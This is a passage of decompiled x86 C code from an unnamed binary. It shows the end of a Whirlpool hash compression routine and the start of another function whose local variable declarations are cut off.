      HIDWORD(v180) = dword_52C5A4[2 * (unsigned __int8)v228[38]];
      v32 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[31]];
      v33 = dword_52C5A4[2 * (unsigned __int8)v228[31]];
      v34 = v180 ^ ((v209 ^ (__PAIR64__(
                               v183 ^ (((unsigned int)v205 ^ (HIDWORD(v26) >> 8)) >> 8),
                               WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[52]] ^ (unsigned int)(__PAIR64__((unsigned int)v205 ^ (HIDWORD(v26) >> 8), v204 ^ (unsigned int)(v26 >> 8)) >> 8)) >> 8)) >> 8);
      v35 = v32 ^ (v34 >> 8);
      v36 = v33 ^ (HIDWORD(v34) >> 8);
      v37 = HIDWORD(v180) ^ (__PAIR64__(v33, v32) >> 24);
      v38 = v180 ^ (v32 << 8);
      v39 = HIDWORD(v209) ^ (__PAIR64__(v37, v38) >> 24);
      v40 = v209 ^ (v38 << 8);
      v41 = v183 ^ (__PAIR64__(v39, v40) >> 24);
      v42 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[52]] ^ (v40 << 8);
      v43 = v205 ^ (__PAIR64__(v41, v42) >> 24);
      v44 = v204 ^ (v42 << 8);
      v45 = v213 ^ (__PAIR64__(v43, v44) >> 24);
      v46 = v31 ^ (v44 << 8);
      HIDWORD(v34) = v29 ^ (__PAIR64__(v45, v46) >> 24);
      LODWORD(v34) = v28 ^ (v46 << 8);
      v47 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[16]] ^ ((_DWORD)v34 << 8) ^ (__PAIR64__(v36, v35) >> 8);
      v48 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[17]];
      v49 = dword_52C5A4[2 * (unsigned __int8)v228[17]];
      v50 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[10]];
      v214 = dword_52C5A4[2 * (unsigned __int8)v228[10]];
      v51 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[3]];
      v52 = dword_52C5A4[2 * (unsigned __int8)v228[3]];
      v227[5] = dword_52C5A4[2 * (unsigned __int8)v228[16]] ^ (v34 >> 24) ^ (v36 >> 8);
      v227[4] = v47;
      v210 = __PAIR64__(v52, v51);
      v190 = dword_52C5A4[2 * (unsigned __int8)v228[60]];
      v189 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[60]];
      LODWORD(v34) = v50 ^ (__PAIR64__(v49, v48) >> 8);
      HIDWORD(v34) = v214 ^ (v49 >> 8);
      HIDWORD(v211) = dword_52C5A4[2 * (unsigned __int8)v228[53]];
      LODWORD(v211) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[53]];
      v185 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[46]];
      v186 = dword_52C5A4[2 * (unsigned __int8)v228[46]];
      v53 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[39]];
      v54 = dword_52C5A4[2 * (unsigned __int8)v228[39]];
      LODWORD(v34) = v189 ^ ((v210 ^ (v34 >> 8)) >> 8);
      HIDWORD(v34) = v190 ^ ((unsigned int)(HIDWORD(v210) ^ (HIDWORD(v34) >> 8)) >> 8);
      LODWORD(v34) = v185 ^ ((v211 ^ (v34 >> 8)) >> 8);
      HIDWORD(v34) = v186 ^ ((HIDWORD(v211) ^ ((v190 ^ ((HIDWORD(v210) ^ ((v214 ^ (v49 >> 8)) >> 8)) >> 8)) >> 8)) >> 8);
      v55 = v53 ^ (v34 >> 8);
      v56 = v54 ^ (HIDWORD(v34) >> 8);
      v57 = v186 ^ (__PAIR64__(v54, v53) >> 24);
      v58 = v185 ^ (v53 << 8);
      v59 = HIDWORD(v211) ^ (__PAIR64__(v57, v58) >> 24);
      v60 = v211 ^ (v58 << 8);
      v61 = v190 ^ (__PAIR64__(v59, v60) >> 24);
      v62 = v189 ^ (v60 << 8);
      v63 = HIDWORD(v210) ^ (__PAIR64__(v61, v62) >> 24);
      v64 = v210 ^ (v62 << 8);
      v65 = v214 ^ (__PAIR64__(v63, v64) >> 24);
      v66 = v50 ^ (v64 << 8);
      HIDWORD(v34) = v49 ^ (__PAIR64__(v65, v66) >> 24);
      LODWORD(v34) = v48 ^ (v66 << 8);
      v67 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[24]] ^ ((_DWORD)v34 << 8) ^ (__PAIR64__(v56, v55) >> 8);
      v68 = dword_52C5A4[2 * (unsigned __int8)v228[24]] ^ (v34 >> 24) ^ (v56 >> 8);
      v69 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[25]];
      v70 = dword_52C5A4[2 * (unsigned __int8)v228[25]];
      v71 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[18]];
      v216 = dword_52C5A4[2 * (unsigned __int8)v228[18]];
      HIDWORD(v206) = dword_52C5A4[2 * (unsigned __int8)v228[11]];
      LODWORD(v206) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[11]];
      v196 = dword_52C5A4[2 * (unsigned __int8)v228[4]];
      v195 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[4]];
      HIDWORD(v208) = dword_52C5A4[2 * (unsigned __int8)v228[61]];
      LODWORD(v208) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[61]];
      v192 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[54]];
      v193 = dword_52C5A4[2 * (unsigned __int8)v228[54]];
      v72 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[47]];
      v73 = dword_52C5A4[2 * (unsigned __int8)v228[47]];
      v227[6] = v67;
      v227[7] = v68;
      LODWORD(v34) = v195 ^ ((v206 ^ ((__PAIR64__(v216, v71) ^ (__PAIR64__(v70, v69) >> 8)) >> 8)) >> 8);
      HIDWORD(v34) = v196 ^ ((HIDWORD(v206) ^ ((v216 ^ (v70 >> 8)) >> 8)) >> 8);
      LODWORD(v34) = v192 ^ ((v208 ^ (v34 >> 8)) >> 8);
      HIDWORD(v34) = v193 ^ ((unsigned int)(HIDWORD(v208) ^ (HIDWORD(v34) >> 8)) >> 8);
      v74 = v72 ^ (v34 >> 8);
      v75 = v73 ^ ((v193 ^ ((HIDWORD(v208) ^ ((v196 ^ ((HIDWORD(v206) ^ ((v216 ^ (v70 >> 8)) >> 8)) >> 8)) >> 8)) >> 8)) >> 8);
      v76 = v193 ^ (__PAIR64__(v73, v72) >> 24);
      v77 = v192 ^ (v72 << 8);
      v78 = HIDWORD(v208) ^ (__PAIR64__(v76, v77) >> 24);
      v79 = v208 ^ (v77 << 8);
      v80 = v196 ^ (__PAIR64__(v78, v79) >> 24);
      v81 = v195 ^ (v79 << 8);
      v82 = HIDWORD(v206) ^ (__PAIR64__(v80, v81) >> 24);
      v83 = v206 ^ (v81 << 8);
      v84 = v216 ^ (__PAIR64__(v82, v83) >> 24);
      v85 = v71 ^ (v83 << 8);
      HIDWORD(v34) = v70 ^ (__PAIR64__(v84, v85) >> 24);
      LODWORD(v34) = v69 ^ (v85 << 8);
      v86 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[32]] ^ ((_DWORD)v34 << 8) ^ (__PAIR64__(v75, v74) >> 8);
      v87 = dword_52C5A4[2 * (unsigned __int8)v228[32]] ^ (v34 >> 24) ^ (v75 >> 8);
      v88 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[33]];
      v89 = dword_52C5A4[2 * (unsigned __int8)v228[33]];
      v90 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[26]];
      v218 = dword_52C5A4[2 * (unsigned __int8)v228[26]];
      HIDWORD(v171) = dword_52C5A4[2 * (unsigned __int8)v228[19]];
      LODWORD(v171) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[19]];
      HIDWORD(v169) = dword_52C5A4[2 * (unsigned __int8)v228[12]];
      LODWORD(v169) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[12]];
      v91 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[5]];
      v92 = dword_52C5A4[2 * (unsigned __int8)v228[5]];
      v227[8] = v86;
      v227[9] = v87;
      HIDWORD(v167) = dword_52C5A4[2 * (unsigned __int8)v228[62]];
      LODWORD(v34) = v169 ^ ((v171 ^ ((__PAIR64__(v218, v90) ^ (__PAIR64__(v89, v88) >> 8)) >> 8)) >> 8);
      HIDWORD(v34) = HIDWORD(v169) ^ ((HIDWORD(v171) ^ ((v218 ^ (v89 >> 8)) >> 8)) >> 8);
      LODWORD(v167) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[62]];
      LODWORD(v34) = v91 ^ (v34 >> 8);
      HIDWORD(v34) = v92 ^ (HIDWORD(v34) >> 8);
      v93 = v167 ^ (v34 >> 8);
      v94 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[55]] ^ (v93 >> 8);
      v95 = dword_52C5A4[2 * (unsigned __int8)v228[55]] ^ (HIDWORD(v93) >> 8);
      HIDWORD(v93) = dword_52C5A4[2 * (unsigned __int8)v228[55]];
      LODWORD(v93) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[55]];
      v96 = v167 ^ (v93 << 8);
      HIDWORD(v96) = v92 ^ (v96 >> 24);
      LODWORD(v96) = v91 ^ ((_DWORD)v96 << 8);
      v97 = __PAIR64__(v218, v90) ^ ((v171 ^ ((v169 ^ (v96 << 8)) << 8)) << 8);
      HIDWORD(v97) = v89 ^ (v97 >> 24);
      LODWORD(v97) = v88 ^ ((_DWORD)v97 << 8);
      v98 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[40]] ^ ((_DWORD)v97 << 8) ^ (__PAIR64__(v95, v94) >> 8);
      v99 = dword_52C5A4[2 * (unsigned __int8)v228[40]] ^ (v97 >> 24) ^ (v95 >> 8);
      v100 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[41]];
      v101 = dword_52C5A4[2 * (unsigned __int8)v228[41]];
      v102 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[34]];
      v220 = dword_52C5A4[2 * (unsigned __int8)v228[34]];
      v103 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[27]];
      v227[10] = v98;
      v227[11] = v99;
      LODWORD(v179) = v103;
      HIDWORD(v179) = dword_52C5A4[2 * (unsigned __int8)v228[27]];
      HIDWORD(v177) = dword_52C5A4[2 * (unsigned __int8)v228[20]];
      LODWORD(v177) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[20]];
      HIDWORD(v175) = dword_52C5A4[2 * (unsigned __int8)v228[13]];
      LODWORD(v175) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[13]];
      v104 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[6]];
      LODWORD(v97) = v177 ^ ((v179 ^ ((__PAIR64__(v220, v102) ^ (__PAIR64__(v101, v100) >> 8)) >> 8)) >> 8);
      HIDWORD(v97) = HIDWORD(v177) ^ ((HIDWORD(v179) ^ ((v220 ^ (v101 >> 8)) >> 8)) >> 8);
      v173 = dword_52C5A4[2 * (unsigned __int8)v228[6]];
      LODWORD(v97) = v104 ^ ((v175 ^ (v97 >> 8)) >> 8);
      HIDWORD(v97) = v173 ^ ((unsigned int)(HIDWORD(v175) ^ (HIDWORD(v97) >> 8)) >> 8);
      v105 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[63]] ^ (v97 >> 8);
      v106 = dword_52C5A4[2 * (unsigned __int8)v228[63]] ^ ((v173 ^ ((HIDWORD(v175) ^ ((HIDWORD(v177) ^ ((HIDWORD(v179) ^ ((v220 ^ (v101 >> 8)) >> 8)) >> 8)) >> 8)) >> 8)) >> 8);
      HIDWORD(v97) = dword_52C5A4[2 * (unsigned __int8)v228[63]];
      LODWORD(v97) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[63]];
      v107 = __PAIR64__(v106, v105) >> 8;
      v108 = __PAIR64__(v220, v102) ^ ((v179 ^ ((v177 ^ ((v175 ^ ((__PAIR64__(v173, v104) ^ (v97 << 8)) << 8)) << 8)) << 8)) << 8);
      HIDWORD(v108) = v101 ^ (v108 >> 24);
      LODWORD(v108) = v100 ^ ((_DWORD)v108 << 8);
      v109 = dword_52C5A4[2 * (unsigned __int8)v228[48]] ^ (v108 >> 24) ^ (v106 >> 8);
      v227[12] = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[48]] ^ ((_DWORD)v108 << 8) ^ v107;
      v227[13] = v109;
      v110 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[49]];
      v111 = dword_52C5A4[2 * (unsigned __int8)v228[49]];
      v112 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[42]];
      v217 = dword_52C5A4[2 * (unsigned __int8)v228[42]];
      HIDWORD(v191) = dword_52C5A4[2 * (unsigned __int8)v228[35]];
      LODWORD(v191) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[35]];
      LODWORD(v108) = v112 ^ (__PAIR64__(v111, v110) >> 8);
      HIDWORD(v108) = v217 ^ (v111 >> 8);
      v188 = dword_52C5A4[2 * (unsigned __int8)v228[28]];
      v187 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[28]];
      HIDWORD(v184) = dword_52C5A4[2 * (unsigned __int8)v228[21]];
      LODWORD(v108) = v187 ^ ((v191 ^ (v108 >> 8)) >> 8);
      HIDWORD(v108) = v188 ^ ((unsigned int)(HIDWORD(v191) ^ (HIDWORD(v108) >> 8)) >> 8);
      LODWORD(v184) = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[21]];
      v182 = dword_52C5A4[2 * (unsigned __int8)v228[14]];
      v181 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[14]];
      v113 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[7]];
      v114 = dword_52C5A4[2 * (unsigned __int8)v228[7]];
      LODWORD(v108) = v181 ^ ((v184 ^ (v108 >> 8)) >> 8);
      HIDWORD(v108) = v182 ^ ((HIDWORD(v184) ^ ((v188 ^ ((HIDWORD(v191) ^ ((v217 ^ (v111 >> 8)) >> 8)) >> 8)) >> 8)) >> 8);
      v115 = v113 ^ (v108 >> 8);
      v116 = v114 ^ (HIDWORD(v108) >> 8);
      v117 = v182 ^ (__PAIR64__(v114, v113) >> 24);
      v118 = v181 ^ (v113 << 8);
      v119 = HIDWORD(v184) ^ (__PAIR64__(v117, v118) >> 24);
      v120 = v184 ^ (v118 << 8);
      v121 = v188 ^ (__PAIR64__(v119, v120) >> 24);
      v122 = v187 ^ (v120 << 8);
      v123 = HIDWORD(v191) ^ (__PAIR64__(v121, v122) >> 24);
      v124 = v191 ^ (v122 << 8);
      v125 = v217 ^ (__PAIR64__(v123, v124) >> 24);
      v126 = v112 ^ (v124 << 8);
      HIDWORD(v108) = v111 ^ (__PAIR64__(v125, v126) >> 24);
      LODWORD(v108) = v110 ^ (v126 << 8);
      v127 = WHIRLPOOL_Constants_52C5A0[2 * (unsigned __int8)v228[56]] ^ ((_DWORD)v108 << 8) ^ (__PAIR64__(v116, v115) >> 8);
      v128 = dword_52C5A4[2 * (unsigned __int8)v228[56]] ^ (v108 >> 24) ^ (v116 >> 8);
      v227[14] = v127;
      v227[15] = v128;
      v129 = 2;
      qmemcpy(v228, v227, sizeof(v228));
      v130 = 0;
      v131 = 8;
      do
      {
        v132 = (unsigned __int8)v229[8 * (((_BYTE)v129 - 3) & 7) + 1];
        v133 = WHIRLPOOL_Constants_52C5A0[2 * v132];
        v134 = dword_52C5A4[2 * v132];
        v135 = (unsigned __int8)v229[8 * (((_BYTE)v129 - 4) & 7) + 2];
        v136 = WHIRLPOOL_Constants_52C5A0[2 * v135];
        HIDWORD(v203) = dword_52C5A4[2 * v135];
        v224 = __PAIR64__(v134, v133);
        v137 = (unsigned __int8)v229[8 * (((_BYTE)v129 + 3) & 7) + 3];
        LODWORD(v203) = v136;
        v138 = WHIRLPOOL_Constants_52C5A0[2 * v137];
        HIDWORD(v201) = dword_52C5A4[2 * v137];
        v139 = (unsigned __int8)v229[8 * (((_BYTE)v129 + 2) & 7) + 4];
        LODWORD(v201) = v138;
        v140 = WHIRLPOOL_Constants_52C5A0[2 * v139];
        HIDWORD(v199) = dword_52C5A4[2 * v139];
        v221 = v129 + 1;
        v141 = (unsigned __int8)v229[8 * ((v129 + 1) & 7) + 5];
        LODWORD(v199) = v140;
        v142 = WHIRLPOOL_Constants_52C5A0[2 * v141];
        v143 = v199 ^ ((v201 ^ ((v203 ^ (__PAIR64__(v134, v133) >> 8)) >> 8)) >> 8);
        HIDWORD(v197) = dword_52C5A4[2 * v141];
        v144 = HIDWORD(v197) ^ (HIDWORD(v143) >> 8);
        v145 = (unsigned __int8)v229[8 * (v129 & 7) + 6];
        LODWORD(v197) = v142;
        v146 = v142 ^ (v143 >> 8);
        v147 = WHIRLPOOL_Constants_52C5A0[2 * v145];
        v194 = dword_52C5A4[2 * v145];
        v148 = (unsigned __int8)v229[8 * (((_BYTE)v129 - 1) & 7) + 7];
        v149 = WHIRLPOOL_Constants_52C5A0[2 * v148];
        v150 = dword_52C5A4[2 * v148];
        LODWORD(v143) = v147 ^ (__PAIR64__(v144, v146) >> 8);
        HIDWORD(v143) = v194 ^ (v144 >> 8);
        v151 = v150 ^ (HIDWORD(v143) >> 8);
        v152 = v149 ^ (v143 >> 8);
        v130 += 2;
        LODWORD(v143) = v224 ^ (((unsigned int)v203 ^ (((unsigned int)v201 ^ (((unsigned int)v199 ^ (((unsigned int)v197 ^ ((v147 ^ (v149 << 8)) << 8)) << 8)) << 8)) << 8)) << 8);
        v153 = (v224 ^ ((v203 ^ ((v201 ^ ((v199 ^ ((v197 ^ (__PAIR64__(
                                                              v194 ^ (unsigned int)(__PAIR64__(v150, v149) >> 24),
                                                              v147 ^ (unsigned int)(v149 << 8)) << 8)) << 8)) << 8)) << 8)) << 8)) >> 24;
        v154 = (unsigned __int8)v228[v130 * 4 + 56];
        v155 = WHIRLPOOL_Constants_52C5A0[2 * v154] ^ ((_DWORD)v143 << 8) ^ (__PAIR64__(v151, v152) >> 8);
        v156 = dword_52C5A4[2 * v154] ^ v153 ^ (v151 >> 8);
        (&v225)[v130] = (__m64 *)(v155 ^ (unsigned int)(&v225)[v130]);
        v227[v130 - 1] ^= v156;
        --v131;
        v129 = v221;
      }
      while ( v131 );
      v7 = (int *)(v198 + 8);
      v157 = (int)(v198 + 8) < (int)&unk_52CDF0;
      qmemcpy(v229, v227, sizeof(v229));
      v198 += 8;
    }
    while ( v157 );
    v158 = v172;
    result = v225;
    v160 = 16;
    do
    {
      v161 = (char *)result + (_DWORD)v223;
      v162 = result->m64_i8[0] ^ result->m64_i8[(_DWORD)v223 + v170];
      result = (__m64 *)((char *)result + 4);
      v163 = *v161 ^ v162;
      v164 = v226;
      result[-1].m64_i8[4] = v163;
      result[-1].m64_i8[5] ^= *(v158 - 1) ^ result->m64_i8[(_DWORD)v164 - 4];
      v165 = *v158 ^ result[-1].m64_i8[6] ^ result->m64_i8[&v229[2] - (char *)a1 - 4];
      v158 += 4;
      result[-1].m64_i8[6] = v165;
      result[-1].m64_i8[7] ^= *(v158 - 3) ^ result->m64_i8[&v229[3] - (char *)a1 - 4];
      --v160;
    }
    while ( v160 );
    v4 = v168 + 64;
    v166 = a3-- == 1;
    v168 += 64;
    v172 = v158;
    v170 += 64;
    if ( v166 )
      break;
    v3 = (char *)a1 - v228;
  }
  return result;
}
// 52C5A0: using guessed type int WHIRLPOOL_Constants_52C5A0[];
// 52C5A4: using guessed type int dword_52C5A4[];
// 73C6D0: using guessed type int dword_73C6D0;

//----- (004D4D00) --------------------------------------------------------
int __cdecl sub_4D4D00(_DWORD *a1, int *a2, int a3)
{
  _DWORD *v3; // edx
  int *v4; // eax
  int v5; // ecx
  int v6; // esi
  int v7; // edi
  int v8; // ebx
  int v9; // ebp
  int v10; // eax
  int v11; // edi
  int v12; // ecx
  int v13; // ebp
  int v14; // esi
  int v15; // ebp
  int v16; // eax
  int v17; // ecx
  int v18; // ebx
  int v19; // edi
  int v20; // ebp
  int v21; // edi
  int v22; // eax
  int v23; // ebx
  int v24; // esi
  int v25; // ecx
  int v26; // edi
  int v27; // ecx
  int v28; // eax
  int v29; // esi
  int v30; // ebp
  int v31; // ebx
  int v32; // ecx
  int v33; // ebx
  int v34; // eax
  int v35; // ebp
  int v36; // edi
  int v37; // esi
  int v38; // ebx
  int v39; // esi
  int v40; // eax
  int v41; // edi
  int v42; // ecx
  int v43; // ebp
  int v44; // esi
  int v45; // ebp
  int v46; // eax
  int v47; // ecx
  int v48; // ebx
  int v49; // edi
  int v50; // ebp
  int v51; // edi
  int v52; // eax
  int v53; // ebx
  int v54; // esi
  int v55; // ecx
  int v56; // edi
  int v57; // ecx
  int v58; // edx
  int v59; // esi
  int v60; // ebp
  int v61; // eax
  int v62; // ecx
  int v63; // ebx
  int v64; // edx
  int v65; // ebp
  int v66; // edi
  int v67; // eax
  int v68; // ebx
  int v69; // esi
  int v70; // edx
  int v71; // edi
  int v72; // ecx
  int v73; // eax
  int v74; // esi
  int v75; // ebp
  int v76; // edx
  int v77; // ecx
  int v78; // ebx
  int v79; // eax
  int v80; // ebp
  int v81; // edi
  int v82; // edx
  int v83; // ebx
  int v84; // esi
  int v85; // eax
  int v86; // edi
  int v87; // ecx
  int v88; // edx
  int v89; // esi
  int v90; // ebp
  int v91; // eax
  int v92; // ecx
  int v93; // ebx
  int v94; // edx
  int v95; // ebp
  int v96; // edi
  int v97; // eax
  int v98; // ebx
  int v99; // esi
  int v100; // edx
  int v101; // edi
  int v102; // ecx
  int v103; // eax
  int v104; // esi
  int v105; // ebp
  int v106; // edx
  int v107; // ecx
  int v108; // ebx
  int v109; // eax
  int v110; // ebp
  int v111; // edi
  int v112; // edx
  int v113; // ebx
  int v114; // esi
  int v115; // eax
  int v116; // edi
  int v117; // ecx
  int v118; // edx
  int v119; // esi
  int v120; // ebp
  int v121; // eax
  int v122; // ecx
  int v123; // ebx
  int v124; // edx
  int v125; // ebp
  int v126; // edi
  int v127; // eax
  int v128; // ebx
  int v129; // esi
  int v130; // edx
  int v131; // edi
  int v132; // ecx
  int v133; // eax
  int v134; // esi
  int v135; // ebp
  int v136; // edx
  int v137; // ecx
  int v138; // ebx
  int v139; // eax
  int v140; // ebp
  int v141; // edi
  int v142; // edx
  int v143; // ebx
  int v144; // esi
  int v145; // eax
  int v146; // edi
  int v147; // ecx
  int v148; // edx
  int v149; // esi
  int v150; // ebp
  int v151; // eax
  int v152; // ecx
  int v153; // ebx
  int v154; // edx
  int v155; // ebp
  int v156; // edi
  int v157; // edx
  int v158; // ebx
  int v159; // esi
  int v160; // edx
  int v161; // edi
  int v162; // ecx
  int v163; // edx
  int v164; // esi
  int v165; // ebp
  int v166; // edx
  int v167; // ecx
  int v168; // ebx
  int v169; // edx
  int v170; // ebp
  int v171; // edi
  int v172; // edx
  int v173; // ebx
  int v174; // esi
  int v175; // edx
  int v176; // edi
  int v177; // ecx
  int v178; // edx
  int v179; // esi
  int v180; // ebp
  int v181; // edx
  int v182; // ecx
  int v183; // ebx
  int v184; // edx
  int v185; // ebp
  int v186; // edi
  int v187; // edx
  int v188; // ebx
  int v189; // esi
  int v190; // edx
  int v191; // edi
  int v192; // ecx
  int v193; // edx
  int v194; // esi
  int v195; // ebp
  int v196; // edx
  int v197; // ecx
  int v198; // ebx
  int v199; // edx
  int v200; // ebp
  int v201; // edi
  int v202; // edx
  int v203; // ebx
  int v204; // esi
  int v205; // eax
  int v206; // edi
  int v207; // ecx
  int v208; // edx
  int v209; // esi
  int v210; // ebp
  int v211; // eax
  int v212; // ecx
  int v213; // ebx
  int v214; // edx
  int v215; // ebp
  int v216; // edi
  int v217; // eax
  int v218; // ebx
  int v219; // esi
  int v220; // edx
  int v221; // edi
  int v222; // ecx
  int v223; // eax
  int v224; // esi
  int v225; // ebp
  int v226; // edx
  int v227; // ecx
  int v228; // ebx
  int v229; // eax
  int v230; // ebp
  int v231; // edi
  int v232; // edx
  int v233; // ebx
  int v234; // esi
  int v235; // eax
  int v236; // edi
  int v237; // ecx
  int v238; // edx
  int v239; // esi
  int v240; // ebp
  int v241; // eax
  int v242; // ecx
  int v243; // ebx
  int v244; // edx
  int v245; // ebp
  int v246; // edi
  int v247; // esi
  int v248; // edi
  int v249; // ebx
  int v250; // ebp
  int v251; // edx
  int v252; // edi
  int v253; // ecx
  int v254; // eax
  int v255; // esi
  int v256; // ebp
  int v257; // edx
  int v258; // ecx
  int v259; // ebx
  int v260; // eax
  int v261; // ebp
  int v262; // edi
  int v263; // edx
  int v264; // ebx
  int v265; // esi
  int v266; // eax
  int v267; // edi
  int v268; // ecx
  int v269; // edx
  int v270; // esi
  int v271; // ebp
  int v272; // eax
  int v273; // ecx
  int v274; // ebx
  int v275; // edx
  int v276; // ebp
  int v277; // edi
  int v278; // eax
  int v279; // ebx
  int v280; // esi
  int v281; // edx
  int v282; // edi
  int v283; // ecx
  int v284; // eax
  int v285; // esi
  int v286; // ebp
  int v287; // edx
  int v288; // ecx
  int v289; // ebx
  int v290; // eax
  int v291; // ebp
  int v292; // edi
  int v293; // edx
  int v294; // ebx
  int v295; // esi
  int v296; // eax
  int v297; // edi
  int v298; // ecx
  int v299; // edx
  int v300; // esi
  int v301; // ebp
  int v302; // edx
  int v303; // ecx
  int v304; // ebx
  int v305; // edx
  int v306; // ebp
  int v307; // edi
  int v308; // edx
  int v309; // ebx
  int v310; // esi
  int v311; // edx
  int v312; // edi
  int v313; // ecx
  int v314; // edx
  int v315; // esi
  int v316; // ebp
  int v317; // edx
  int v318; // ecx
  int v319; // ebx
  int v320; // edx
  int v321; // ebp
  int v322; // edi
  int v323; // edx
  int v324; // ebx
  int v325; // esi
  int v326; // edx
  int v327; // edi
  int v328; // ecx
  int v329; // edx
  int v330; // esi
  int v331; // ebp
  int v332; // edx
  int v333; // ecx
  int v334; // ebx
  int v335; // edx
  int v336; // ebp
  int v337; // edi
  int v338; // edx
  int v339; // ebx
  int v340; // esi
  int v341; // edx
  int v342; // edi
  int v343; // ecx
  int v344; // edx
  int v345; // esi
  int v346; // ebp
  int v347; // edx
  int v348; // ecx
  int v349; // ebx
  int v350; // eax
  int v351; // ebp
  int v352; // edi
  int v353; // edx
  int v354; // ebx
  int v355; // esi
  int v356; // eax
  int v357; // edi
  int v358; // ecx
  int v359; // edx
  int v360; // esi
  int v361; // ebp
  int v362; // eax
  int v363; // ecx
  int v364; // ebx
  int v365; // edx
  int v366; // ebp
  int v367; // edi
  int v368; // eax
  int v369; // ebx
  int v370; // esi
  int v371; // edx
  int v372; // edi
  int v373; // ecx
  int v374; // eax
  int v375; // esi
  int v376; // ebp
  int v377; // edx
  int v378; // ecx
  int v379; // ebx
  int v380; // eax
  int v381; // ebp
  int v382; // edi
  int v383; // edx
  int v384; // ebx
  int v385; // esi
  int v386; // eax
  int v387; // edi
  int v388; // ecx
  int v389; // edx
  int v390; // esi
  int v391; // ebp
  int v392; // eax
  int v393; // ecx
  int v394; // ebx
  int v395; // edx
  int v396; // ebp
  int v397; // edi
  int v398; // eax
  int v399; // ebx
  int v400; // esi
  int v401; // edx
  int v402; // edi
  int v403; // ecx
  int v404; // eax
  int v405; // esi
  int v406; // ebp
  int v407; // edx
  int v408; // ecx
  int v409; // ebx
  int v410; // eax
  int v411; // ebp
  int v412; // edi
  int v413; // edx
  int v414; // ebx
  int v415; // esi
  int v416; // eax
  int v417; // edi
  int v418; // ecx
  int v419; // edx
  int v420; // esi
  int v421; // ebp
  int v422; // eax
  int v423; // ecx
  int v424; // ebx
  int v425; // edx
  int v426; // ebp
  int v427; // edi
  int v428; // eax
  int v429; // ebx
  int v430; // esi
  int v431; // edx
  int v432; // edi
  int v433; // ecx
  int v434; // eax
  int v435; // esi
  int v436; // ebp
  int v437; // edx
  int v438; // ecx
  int v439; // ebx
  int v440; // edx
  int v441; // ebp
  int v442; // edi
  int v443; // eax
  int v444; // ebx
  int v445; // esi
  int v446; // ecx
  int v447; // edi
  int v448; // ecx
  int v449; // eax
  int v450; // esi
  int v451; // ebp
  int v452; // ebx
  int v453; // ecx
  int v454; // ebx
  int v455; // eax
  int v456; // ebp
  int v457; // edi
  int v458; // esi
  int v459; // ebx
  int v460; // esi
  int v461; // eax
  int v462; // edi
  int v463; // ecx
  int v464; // ebp
  int v465; // esi
  int v466; // ebp
  int v467; // eax
  int v468; // ecx
  int v469; // ebx
  int v470; // edi
  int v471; // ebp
  int v472; // edi
  int v473; // eax
  int v474; // ebx
  int v475; // esi
  int v476; // ecx
  int v477; // edi
  int v478; // ecx
  int v479; // eax
  int v480; // esi
  int v481; // ebp
  int v482; // ebx
  int v483; // ecx
  int v484; // ebx
  int v485; // eax
  int v486; // ebp
  int v487; // edi
  int v488; // esi
  int v489; // ebx
  int v490; // ebp
  int v491; // ecx
  int v492; // esi
  int v493; // edi
  int result; // eax
  int v495; // [esp+0h] [ebp-7Ch]
  int v496; // [esp+4h] [ebp-78h]
  int v497; // [esp+8h] [ebp-74h]
  int v498; // [esp+Ch] [ebp-70h]
  int v499; // [esp+10h] [ebp-6Ch]
  int v500; // [esp+14h] [ebp-68h]
  int v501; // [esp+18h] [ebp-64h]
  int v502; // [esp+1Ch] [ebp-60h]
  int v503; // [esp+20h] [ebp-5Ch]
  int v504; // [esp+24h] [ebp-58h]
